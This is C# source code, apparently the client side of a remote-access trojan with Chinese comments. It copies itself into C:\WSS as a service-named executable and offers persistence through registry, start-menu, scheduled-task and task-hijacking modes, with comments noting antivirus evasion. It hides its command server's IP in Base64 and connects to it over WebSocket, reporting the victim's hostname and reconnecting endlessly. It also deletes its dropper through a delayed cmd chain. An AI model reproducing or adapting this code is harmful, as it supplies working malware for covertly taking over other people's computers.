using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace websocket
{
    class Example
    {
        public static bool IsProcessExist(String proName)
        {
            foreach (System.Diagnostics.Process thisproc in System.Diagnostics.Process.GetProcessesByName(proName))
            {
                if (thisproc.ProcessName.ToLower().Trim() == proName.ToLower().Trim())
                {
                    return true;
                }
            }
            return false;
        }

        public static string RootPath = @"C:\WSS\";//要生成的路径
        public static string ServiceName = "WSService";//要生成的文件名
        public static string destinationPath = RootPath + ServiceName + ".exe";//要生成的完整路径
        public static int startupCode = 886;//0:开始菜单启动 1:注册表启动 2:计划任务启动 3:计划任务劫持启动 886:不自启动  [会被360拦截导致自启动失效 不过仍然会上线]
        public static string changeName = "_UpdateWs";//被劫持文件添加后缀
        public static string ip = "MTI3LjAuMC4x";//BASE64加密服务端IP
        public static string pathCreate;


        static void Main(string[] args)
        {
            if (!Directory.Exists(RootPath))//如果不存在且不为劫持启动就创建
            {
                Directory.CreateDirectory(RootPath);
            }

            if (!IsProcessExist(ServiceName))
            {
                pathCreate = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                //记录生成器路径
                FileStream fs1 = new FileStream(RootPath + "path.ini", FileMode.Create, FileAccess.Write);
                StreamWriter sw1 = new StreamWriter(fs1);
                sw1.WriteLine(pathCreate);
                sw1.Close();
                fs1.Close();

                if (startupCode == 3)
                {
                    //设定启动项
                    StartupWay startupWay = new StartupWay();
                    startupWay.doStartUpWay(startupCode, pathCreate, ServiceName, changeName);//传送生成器所在位置
                }
                else
                {
                    //如果不存在就生成
                    if (!System.IO.File.Exists(destinationPath))
                    {
                        //拷贝到特定目录
                        FileInfo fi = new FileInfo(pathCreate);
                        if (!fi.Exists)
                        {
                            fi.CreateText();
                        }
                        fi.CopyTo(destinationPath);
                    }
                    //运行目标
                    MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                    myWindowsCmd.StartCmd();
                    myWindowsCmd.RunCmd(destinationPath);
                    myWindowsCmd.WaitForExit();
                    myWindowsCmd.StopCmd();
                    //设定启动项
                    StartupWay startupWay = new StartupWay();
                    startupWay.doStartUpWay(startupCode, RootPath, ServiceName, changeName);
                }
            }
            else
            {
                //删除生成器
                bool fistDel = false;
                if (File.Exists(RootPath + "path.ini"))
                {
                    fistDel = true;
                }
                if (fistDel)
                {
                    string path = File.ReadAllText(RootPath + "path.ini", Encoding.Default);
                    string delCreate = "del " + path;
                    if (startupCode == 3)
                    {
                        delCreate += " & rmdir /s /q " + RootPath;
                    }
                    string delIni = "del " + RootPath + "path.ini";
                    MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                    myWindowsCmd.StartCmd();
                    myWindowsCmd.RunCmd("ping -n 5 127.0.0.1>nul & " + delIni + " & " + delCreate);//延时五秒执行
                    myWindowsCmd.WaitForExit();
                    myWindowsCmd.StopCmd();
                }
                if (startupCode == 3)
                {
                    string trueTaskExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Replace(".exe", "") + changeName + ".exe";
                    if (File.Exists(trueTaskExe))//真计划任务文件是否存在
                    {
                        //运行真文件
                        MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                        myWindowsCmd.StartCmd();
                        myWindowsCmd.RunCmd(trueTaskExe);
                        myWindowsCmd.WaitForExit();
                        myWindowsCmd.StopCmd();
                    }
                }
                Base64Tools base64Tools = new Base64Tools();
                string url = "ws://" + base64Tools.base64decode(ip) + ":7272";

                WebSocketService wss = new BuissnesServiceImpl();
                WebSocketBase wb = new WebSocketBase(url, wss);
                wb.start();

                wb.send("{\"type\":\"login\",\"client_name\":\"" + System.Net.Dns.GetHostName() + "-" + "\"}");

                //发生断开重连时，需要重新订阅
                while (true)
                {
                    if (wb.isReconnect())
                    {
                        wb.send("{\"type\":\"login\",\"client_name\":\"" + System.Net.Dns.GetHostName() + "-" + "\"}");
                    }
                    Thread.Sleep(1000);
                }
            }
        }

        public static List<string> GetFileListWithExtend(DirectoryInfo directory, string pattern)
        {
            List<string> pathList = new List<string>();
            string result = String.Empty;
            if (directory.Exists || pattern.Trim() != string.Empty)
            {
                foreach (FileInfo info in directory.GetFiles(pattern))
                {
                    result = info.FullName.ToString();
                    pathList.Add(result);
                }
            }
            return pathList;
        }
    }

}
